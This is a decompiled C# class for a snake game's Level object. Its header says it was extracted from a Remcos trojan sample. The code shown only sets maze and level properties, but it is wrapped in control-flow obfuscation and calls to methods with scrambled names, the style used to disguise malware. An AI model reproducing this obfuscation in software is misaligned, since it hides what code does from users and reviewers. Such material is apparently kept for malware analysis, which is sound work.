// Decompiled with JetBrains decompiler
// Type: Vändtia_Live_Server.Level
// Assembly: yDseEhTG5bnen4G, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4C5C9DF7-D67E-851A-F932-4F9F562A97E6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan.MSIL.Remcos.gen-a9fcf50b626f7a735761798ddff08a65e037fbde2ef6e57f066150543ebcb249.exe

using System;
using Vändtia_Live_Server.My;

namespace Vändtia_Live_Server
{
  public class Level
  {
    public string Name { get; }

    public int FoodItemsCount { get; }

    public int MoveDelay { get; }

    public int Index { get; }

    public bool[] Maze { get; }

    public char FoodItem { get; }

    public Level(
      int index,
      string name,
      int foodItemsCount,
      int moveDelay,
      bool[] maze,
      char foodItem = '█')
    {
label_5:
      int num1 = 4;
      int num2 = -29;
      while (true)
      {
        switch ((num2 ^ 53) + 45)
        {
          case 0:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Level.\u002Ector);
            num2 = -26;
            continue;
          case 1:
            goto label_5;
          case 2:
            switch (num1)
            {
              case 52:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Level.get_Maze);
                num1 = 7;
                goto label_1;
              case 53:
                this.Name = name;
                num1 = 11;
                goto label_1;
              case 54:
                this.MoveDelay = moveDelay;
                num1 = 10;
                goto label_1;
              case 55:
                this.Index = index;
                num1 = 6;
                goto label_1;
              case 56:
                this.FoodItemsCount = foodItemsCount;
                num1 = 5;
                goto label_1;
              case 57:
                this.Maze = maze;
                num1 = 9;
                goto label_1;
              case 58:
                this.FoodItem = foodItem;
                num1 = 8;
                goto label_1;
              case 59:
                goto label_15;
              default:
                num2 = -31;
                continue;
            }
          case 3:
label_1:
            num1 ^= 51;
            break;
        }
        num2 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7D.\uE123\uEF7F\uEEEB\uE230\uE2DD\uE2EA\uF079\uF000\uF4BC\uF8BE\uF536\uE7F1(45);
      }
label_15:;
    }

    public bool get_IntersectsWith(Segment s)
    {
label_7:
      int num1 = 6;
      int num2 = -26;
      bool intersectsWith;
      while (true)
      {
        switch ((num2 ^ 48) + 45)
        {
          case 0:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Level.get_Name);
            num2 = -29;
            continue;
          case 1:
            switch (num1)
            {
              case 52:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Level.get_Index);
                num1 = 4;
                goto label_1;
              case 53:
              case 55:
                goto label_10;
              case 54:
                intersectsWith = this.Maze[checked (s.Y * Console.WindowWidth + s.X)];
                num1 = 5;
                goto label_1;
              default:
                num2 = -27;
                continue;
            }
          case 2:
            goto label_7;
          case 3:
label_1:
            num1 ^= 48;
            break;
        }
        num2 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(14);
      }
label_10:
      return intersectsWith;
    }
  }
}
